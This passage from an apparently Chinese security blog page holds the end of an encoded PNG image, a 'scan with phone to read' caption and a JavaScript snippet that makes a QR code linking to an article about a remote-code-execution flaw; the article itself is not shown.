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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/antasys-dgn\_tools-tracert-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 